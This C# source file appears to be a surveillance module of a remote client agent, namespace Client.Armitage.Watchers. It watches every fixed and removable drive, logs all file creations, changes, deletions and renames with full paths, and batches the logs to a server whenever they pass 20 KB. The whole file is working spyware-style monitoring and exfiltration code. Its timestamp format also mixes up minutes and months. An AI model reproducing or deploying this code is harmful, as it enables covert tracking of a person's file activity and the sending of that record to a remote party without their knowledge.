using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Armitage.Watchers
{
    /// <summary>
    /// Logs all file events that happen on all disks.
    /// </summary>
    public static class Filesystem
    {
        /// <summary>
        /// The size of the logs until they got sent to the server.
        /// </summary>
        private static int _threshold = 20000; // 20kb

        private static StringBuilder _logs;

        private static List<FileSystemWatcher> _watchers = new List<FileSystemWatcher>();
        public async static void Start()
        {
            await Task.Run(() =>
            {
                try
                {
                    _logs = new StringBuilder();

                    var drives = GetDrivesRoot();

                    foreach (var drive in drives)
                    {
                        FileSystemWatcher _watcher = new FileSystemWatcher(drive);
                        _watcher.IncludeSubdirectories = true;
                        _watcher.EnableRaisingEvents = true;

                        _watcher.NotifyFilter = NotifyFilters.Attributes
                                           | NotifyFilters.CreationTime
                                           | NotifyFilters.DirectoryName
                                           | NotifyFilters.FileName
                                           | NotifyFilters.LastAccess
                                           | NotifyFilters.LastWrite
                                           | NotifyFilters.Security
                                           | NotifyFilters.Size;

                        _watcher.Changed += OnChanged;
                        _watcher.Created += OnCreated;
                        _watcher.Deleted += OnDeleted;
                        _watcher.Renamed += OnRenamed;
                        _watcher.Error += OnError;

                        _watchers.Add(_watcher);
                    }
                }
                catch (Exception ex){
                    AddLog("Error intializing filesystem recorder:\r\n"+ex.ToString()
                        , true);
                }
            });
        }
        private static void OnChanged(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType != WatcherChangeTypes.Changed)
            {
                return;
            }

            AddLog($"Changed: {e.FullPath}");
        }

        private static void OnCreated(object sender, FileSystemEventArgs e)
        {
            string value = $"Created: {e.FullPath}";
            AddLog(value);
        }

        private static void OnDeleted(object sender, FileSystemEventArgs e) =>
            AddLog($"Deleted: {e.FullPath}");

        private static void OnRenamed(object sender, RenamedEventArgs e)
        {
            AddLog($"Renamed:");
            AddLog($"    Old: {e.OldFullPath}");
            AddLog($"    New: {e.FullPath}");
        }

        private static void OnError(object sender, ErrorEventArgs e) =>
            AddLog(e.GetException().ToString());

        public static List<string> GetDrivesRoot()
        {
            List<string> roots = new List<string>();
            var drives = DriveInfo.GetDrives();
            foreach (var drive in drives)
                if (drive.IsReady &&
                        (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable))
                    roots.Add(drive.RootDirectory.FullName);

            return roots;
        }

        private static void AddLog(string log, bool forcesend = false)
        {
            string formatted = $"[{DateTime.Now.ToString("dd-mmm-yyyy hh:mm:ss.s")}] {log}";
            _logs.AppendLine(formatted);

            if (forcesend || _logs.Length > _threshold)
            {
                Communication.String_Stacker.Send(_logs.ToString(), Communication.String_Stacker.StringType.FileEvent);
                Console.WriteLine($"Sent {_logs.Length}");
                _logs.Clear();
            }
        }
    }
}
